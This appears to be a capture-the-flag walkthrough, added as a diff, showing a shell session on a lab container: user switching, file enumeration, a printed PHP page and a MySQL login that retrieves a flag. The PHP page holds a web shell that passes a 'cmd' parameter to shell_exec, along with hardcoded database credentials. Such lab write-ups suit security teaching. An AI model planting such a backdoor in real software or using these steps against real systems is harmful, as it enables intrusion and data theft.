@@ -1,0 +1,157 @@
+morpheus@lxc-sysadmin:~$ su - architect
+Password: FLAG-232f99b4178bdc7fef7eb1f0f78831f9
+
+architect@lxc-sysadmin:~$ find . -readable -and -user architect 2>/dev/null | head -n 10
+.
+./.bashrc
+./.bash_logout
+./.profile
+
+architect@lxc-sysadmin:~$ cd ../../
+
+architect@lxc-sysadmin:/$ ls -ltra
+total 72
+drwxr-xr-x    2 root root 4096 Apr 12  2016 boot
+drwxr-xr-x    2 root root 4096 Aug 25  2017 srv
+drwxr-xr-x    2 root root 4096 Aug 25  2017 mnt
+drwxr-xr-x    2 root root 4096 Aug 25  2017 opt
+drwxr-xr-x    2 root root 4096 Aug 25  2017 media
+drwxr-xr-x   10 root root 4096 Aug 25  2017 usr
+drwxr-xr-x    2 root root 4096 Feb 26  2018 lib64
+drwxr-xr-x   12 root root 4096 May 30  2018 var
+drwxr-xr-x   13 root root 4096 May 30  2018 lib
+drwxr-xr-x    2 root root 4096 May 30  2018 sbin
+drwxr-xr-x    2 root root 4096 May 30  2018 backup
+drwxr-xr-x    2 root root 4096 May 30  2018 bin
+drwxr-xr-x    8 root root 4096 May 30  2018 home
+drwxr-xr-x   72 root root 4096 Oct  2 20:02 etc
+drw-------    4 root root 4096 Oct 17 03:00 root
+-rw-------    1 root root    0 Dec  8 00:06 nohup.out
+drwxr-xr-x   22 root root 4096 Mar 13 16:36 ..
+drwxr-xr-x   22 root root 4096 Mar 13 16:36 .
+dr-xr-xr-x 1079 root root    0 Mar 13 16:36 proc
+drwxr-xr-x    7 root root  520 Mar 13 16:36 dev
+dr-xr-xr-x   13 root root    0 Mar 13 21:01 sys
+drwxr-xr-x   13 root root  440 Mar 24 18:05 run
+drwxrwx-wt    7 root root 4096 Mar 24 18:15 tmp
+
+architect@lxc-sysadmin:/$ find . -readable -and -user architect 2>/dev/null | head -n 10
+./var/www/index.php
+./home/architect
+./home/architect/.bashrc
+./home/architect/.bash_logout
+./home/architect/.profile
+./proc/15326
+./proc/15326/task
+./proc/15326/task/15326
+./proc/15326/task/15326/fd
+./proc/15326/task/15326/fdinfo
+
+-	-	-	-	-	-	-	-	-	-
+
+architect@lxc-sysadmin:/$ cat /var/www/index.php 
+<?php
+if(isset($_GET['cmd'])) {
+  $res = shell_exec(urldecode($_GET['cmd']));
+  print_r(str_replace("\n", '<br />', $res));
+  exit();
+}
+$info = (object)array();
+$info->username = "arch";
+$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";
+$id = 1003;
+
+function GetList($id, $info) {
+        $id = 2;
+        $link = mysql_connect("127.0.0.1", $info->username, $info->password);
+        mysql_select_db("arch", $link);
+        $result = mysql_query("SELECT * FROM arch");
+        $output = array();
+        while($row = mysql_fetch_assoc($result)) {
+                array_push($output, $row);
+        }
+        var_dump($output);
+        return $output;
+}
+
+$output = shell_exec('id');
+echo "<pre>$output</pre>";
+
+?>
+<?php
+//ENTER THE RELEVANT INFO BELOW
+$mysqlDatabaseName ="arch";
+$mysqlUserName ="arch";
+$mysqlPassword ="asdftgTst5sdf6309sdsdff9lsdftz";
+$mysqlHostName ="127.0.0.1";
+$mysqlExportPath ="/var/tmp/ar.sql";
+
+//DO NOT EDIT BELOW THIS LINE
+//Export the database and output the status to the page
+$command='mysqldump --opt -h' .$mysqlHostName .' -u' .$mysqlUserName .' -p' .$mysqlPassword .' ' .$mysqlDatabaseName .' > ' .$mysqlExportPath;
+exec($command,$output=array(),$worked);
+switch($worked){
+case 0:
+echo 'Database <b>' .$mysqlDatabaseName .'</b> successfully exported to <b>~/' .$mysqlExportPath .'</b>';
+break;
+case 1:
+echo 'There was a warning during the export of <b>' .$mysqlDatabaseName .'</b> to <b>~/' .$mysqlExportPath .'</b>';
+break;
+case 2:
+echo 'There was an error during export. Please check your values:<br/><br/><table><tr><td>MySQL Database Name:</td><td><b>' .$mysqlDatabaseName .'</b></td></tr><tr><td>MySQL User Name:</td><td><b>' .$mysqlUserName .'</b></td></tr><tr><td>MySQL Password:</td><td><b>NOTSHOWN</b></td></tr><tr><td>MySQL Host Name:</td><td><b>' .$mysqlHostName .'</b></td></tr></table>';
+break;
+}
+?>
+
+
+
+<!DOCTYPE html>
+<html>
+        <head>
+                <title>Architect list query</title>
+        </head>
+        <body>
+                <form action="" method="GET">
+                        <input type="text" name="id" />
+                        <input type="submit" value="search">
+                </form>
+                <?php foreach(GetList(1003, $info) as $item):
+                        echo $item["id"] . ":" . $item["arch"] . "<br />\r\n";
+                endforeach; ?>
+        </body>
+</html>
+
+-	-	-	-	-	-	-	-	-	-	-	-	-	-
+
+architect@lxc-sysadmin:/$ mysql -u arch -p
+Enter password: asdftgTst5sdf6309sdsdff9lsdftz
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 84
+Server version: 5.7.22-0ubuntu0.16.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show tables;
++----------------+
+| Tables_in_arch |
++----------------+
+| arch           |
+| flag           |
++----------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from arch.flag;
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| FLAG-55548fdb24a6ef248d8fdfde2720f6bd |
++---------------------------------------+
+1 row in set (0.00 sec)
+
+=> FLAG-55548fdb24a6ef248d8fdfde2720f6bd
